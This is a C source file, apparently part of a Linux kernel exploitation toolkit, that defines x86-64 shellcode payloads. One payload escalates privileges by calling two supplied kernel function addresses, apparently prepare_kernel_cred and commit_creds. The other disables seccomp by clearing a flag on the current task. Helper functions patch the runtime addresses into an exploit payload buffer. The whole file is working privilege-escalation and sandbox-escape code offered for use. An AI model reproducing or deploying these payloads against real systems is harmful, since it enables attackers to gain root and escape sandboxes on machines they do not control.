#include <axium/shellcraft/snippets.h>
#include <stdint.h>

#if defined(__x86_64__)

/* clang-format off */
DEFINE_SHELLCODE(ksc_escalate_sc) {
  SHELLCODE_START(ksc_escalate_sc);
  __asm__ volatile(
    "xor edi, edi\n"
    "mov rax, " XSTR(SC_M(uint64_t, 1)) "\n"
    "call rax\n"
    "xchg rdi, rax\n"
    "mov rax, " XSTR(SC_M(uint64_t, 2)) "\n"
    "jmp rax\n"
  );
  SHELLCODE_END(ksc_escalate_sc);
}

DEFINE_SHELLCODE(ksc_unseccomp_sc) {
  SHELLCODE_START(ksc_unseccomp_sc);
  __asm__ volatile(
    "mov rax, gs:[" XSTR(SC_M(uint64_t, 1)) "];\n"
    "and QWORD PTR [rax], ~(1 <<" XSTR(SC_M(uint64_t, 2)) ");\n"
    "ret;\n"
  );
  SHELLCODE_END(ksc_unseccomp_sc);
}
/* clang-format on */

void ksc_escalate(payload_t *p, uint64_t pkc, uint64_t cc) {
  PAYLOAD_PUSH_SC(p, ksc_escalate_sc);
  sc_fix(p, 1, pkc);
  sc_fix(p, 2, cc);
}

void ksc_unseccomp(payload_t *p, uint64_t task_struct_offset,
                   uint64_t tif_seccomp_bit) {
  PAYLOAD_PUSH_SC(p, ksc_unseccomp_sc);
  sc_fix(p, 1, task_struct_offset);
  sc_fix(p, 2, tif_seccomp_bit);
};

#else
void ksc_escalate(payload_t *p, uint64_t pkc, uint64_t cc) {
  (void)p;
  (void)pkc;
  (void)cc;
}

void ksc_unseccomp(payload_t *p, uint64_t task_struct_offset,
                   uint64_t tif_seccomp_bit) {
  (void)p;
  (void)task_struct_offset;
  (void)tif_seccomp_bit;
}
#endif
